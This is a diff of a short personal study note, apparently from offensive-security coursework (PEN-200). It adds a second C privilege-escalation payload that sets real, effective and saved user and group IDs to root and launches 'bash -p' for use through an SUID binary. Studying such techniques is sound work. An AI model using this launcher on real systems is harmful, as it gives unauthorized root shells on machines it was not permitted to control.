@@ -1,7 +1,7 @@
 # Minimal SUID Shell Launcher
 
 author:: Nathan Acks  
-date:: 2022-07-11
+date:: 2022-08-05
 
 ```c
 #include <stdio.h>
@@ -17,6 +17,20 @@ main() {
 }
 ```
 
+Alternate approach:
+
+```c
+#include <stdio.h>
+#include <time.h>
+
+main() {
+	setresuid(0, 0, 0);
+	setregid(0, 0, 0);
+	system("/bin/bash -p");
+	return 0;
+}
+```
+
 Once compiled, this needs to be called by an SUID binary. The `-p` is required to keep bash from dropping privileges.
 
 Note that this is very similar to the `LD_PRELOAD` trick, except that we’re using `execl()` instead of `system()` and dropping a header.
@@ -27,3 +41,4 @@ Note that this is very similar to the `LD_PRELOAD` trick, except that we’re us
 * [unistd's execl() without passing any arguments](https://stackoverflow.com/a/34400649)
 * [Exploiting Bash](exploiting-bash.md)
 * [Exploiting LD_PRELOAD](exploiting-ld-preload.md)
+* [2022-08-05 - OffSec Live: PEN-200](../log/2022-08-05-offsec-live-pen-200.md)
